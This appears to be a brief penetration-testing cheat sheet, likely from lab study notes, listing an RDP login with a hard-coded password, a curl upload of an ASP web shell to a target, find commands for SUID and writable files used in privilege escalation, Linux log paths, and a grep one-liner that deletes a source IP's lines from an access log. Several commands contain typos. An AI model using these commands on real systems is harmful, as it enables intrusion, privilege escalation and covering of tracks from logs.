# **commands**

rdesktop -u Administrator -p WIN20082017 ip  
  
#Curl upload file  
curl [http://](http://10.11.1.229/)ip --upload-file shell.asp  
  
  
  
  
  
#SUID  
find / -perm -4000 -type f 2>/dev/null  
  
#writable permission  
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/nul  
  
  
  
#

## Find files with SUID permission for current user

  
  
find / perm /u=s -user `whoami` 2>/dev/null  
find / -user root -perm -4000 -print 2>/dev/null  
  
#open permission  
find / -perm -777 -type f 2>/dev/null  
  
  
#log files  
/var/log/messages  
/var/logs  
/var/log/auth.log  
/var/log/apache2/access.log  
/var/log/apache2/error.log  
grep -v '<src-ip-address>' /path/to/access_log > a && mv a /path/to/access_log